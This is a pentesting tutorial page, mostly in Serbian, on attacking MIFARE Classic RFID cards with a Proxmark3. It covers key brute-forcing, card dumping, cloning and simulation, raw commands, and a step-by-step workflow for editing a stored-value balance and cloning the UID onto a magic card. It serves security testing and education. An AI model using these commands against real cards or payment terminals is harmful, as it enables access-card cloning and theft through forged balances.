# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Napadi na RFID sisteme pomoću Proxmark3

The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**instalirate softver i njegove zavisnosti**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Napad na MIFARE Classic 1KB

Ima **16 sektora**, svaki od njih ima **4 bloka** i svaki blok sadrži **16B**. UID se nalazi u sektor 0 blok 0 (i ne može biti promenjen).\
Za pristup svakom sektoru potrebna su **2 ključa** (**A** i **B**) koja su smeštena u **bloku 3 svakog sektora** (sector trailer). Sector trailer takođe čuva **access bits** koji daju **dozvole za čitanje i pisanje** na **svaki blok** koristeći ta 2 ključa.\
Dva ključa su korisna da bi se dodelile dozvole za čitanje ako znate prvi i za pisanje ako znate drugi (na primer).

Mogu se izvesti nekoliko napada
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 omogućava izvođenje i drugih akcija, kao što su **eavesdropping** **Tag to Reader communication**, kako bi se pokušalo pronaći osetljive podatke. Na ovoj kartici možete jednostavno presresti komunikaciju i izračunati korišćen ključ, jer su **kriptografske operacije koje se koriste slabe**, i poznavajući plain i cipher text možete ga izračunati (`mfkey64` tool).

#### MiFare Classic kratak tok rada za zloupotrebu stored-value

Kada terminali pohranjuju stanja na Classic karticama, tipičan end-to-end tok je:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Beleške

- `hf mf autopwn` orkestrira nested/darkside/HardNested-style napade, vraća ključeve i kreira dumpove u client dumps folderu.
- Pisanje bloka 0/UID radi samo na magic gen1a/gen2 karticama. Normalne Classic kartice imaju samo za čitanje UID.
- Mnoge implementacije koriste Classic "value blocks" ili jednostavne kontrolne sume. Osigurajte da su sva duplicirana/komplementirana polja i kontrolne sume usaglašena nakon izmena.

Pogledajte metodologiju višeg nivoa i mitigacije u:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw komande

IoT sistemi ponekad koriste **nebrendirane ili nekomercijalne tagove**. U tom slučaju možete koristiti Proxmark3 za slanje prilagođenih **raw komandi ka tagovima**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Sa ovim informacijama možete pokušati da pronađete podatke o kartici i o načinu komunikacije sa njom. Proxmark3 omogućava slanje raw komandi kao što su: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 softver dolazi sa unapred učitanom listom **skripti za automatizaciju** koje možete koristiti za obavljanje jednostavnih zadataka. Da biste dobili kompletnu listu, koristite `script list` komandu. Zatim upotrebite `script run` komandu, praćenu imenom skripte:
```
proxmark3> script run mfkeys
```
Možeš napraviti skriptu za **fuzz tag readers** — ako kopiraš podatke **valid card**, jednostavno napiši **Lua script** koji **randomize** jedan ili više nasumičnih **bytes** i proverava da li **reader crashes** pri nekoj iteraciji.

## Reference

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
